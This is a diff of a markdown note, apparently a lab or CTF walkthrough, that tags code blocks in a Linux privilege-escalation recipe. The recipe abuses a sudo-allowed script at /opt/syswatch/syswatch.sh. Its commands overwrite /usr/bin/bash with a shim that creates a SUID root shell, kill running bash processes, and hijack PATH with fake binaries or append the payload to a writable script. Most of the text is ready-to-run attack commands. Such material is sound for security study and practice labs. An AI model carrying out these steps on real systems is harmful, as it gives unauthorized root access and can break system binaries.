@@ -6,6 +6,7 @@ When a sudo-allowed script calls a binary **without an absolute path** (or relie
 
 ## Recon
 
+<!-- cmd: linux -->
 ```bash
 sudo -l
 ```
@@ -20,6 +21,7 @@ Inspect the script if readable — `syswatch.sh` calls `bash` without `/usr/bin/
 
 ### 1. Backup real bash
 
+<!-- cmd: linux -->
 ```bash
 cp /usr/bin/bash /tmp/bash.bak
 chmod +x /tmp/bash.bak
@@ -27,6 +29,7 @@ chmod +x /tmp/bash.bak
 
 ### 2. Drop into sh & kill running bash so the file isn't busy
 
+<!-- cmd: linux -->
 ```bash
 exec sh
 pkill -9 bash
@@ -35,6 +38,7 @@ lsof /usr/bin/bash     # should return nothing
 
 ### 3. Replace `/usr/bin/bash` with a shim that creates a SUID shell
 
+<!-- cmd: linux -->
 ```bash
 cat > /usr/bin/bash << 'EOF'
 #!/tmp/bash.bak
@@ -48,6 +52,7 @@ The shebang points at the real bash binary (`/tmp/bash.bak`) so the shim still p
 
 ### 4. Trigger via sudo
 
+<!-- cmd: linux -->
 ```bash
 sudo /opt/syswatch/syswatch.sh --version
 ```
@@ -56,6 +61,7 @@ The script runs as root → calls `bash` → our shim executes → `/tmp/rootbas
 
 ### 5. Spawn root shell
 
+<!-- cmd: linux -->
 ```bash
 /tmp/rootbash -p
 whoami   # root
@@ -67,6 +73,7 @@ whoami   # root
 
 If the script calls an unqualified binary other than `bash` (e.g. `cp`, `id`):
 
+<!-- cmd: linux -->
 ```bash
 cp /bin/bash /tmp/cp
 chmod +x /tmp/cp
@@ -79,6 +86,7 @@ Sudo rules normally reset `PATH` via `secure_path`. If the rule includes `env_ke
 ## Alternative — Direct Script Modification
 
 If `/opt/syswatch/syswatch.sh` is writable by the current user:
+<!-- cmd: linux -->
 ```bash
 echo "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash" >> /opt/syswatch/syswatch.sh
 sudo /opt/syswatch/syswatch.sh --version
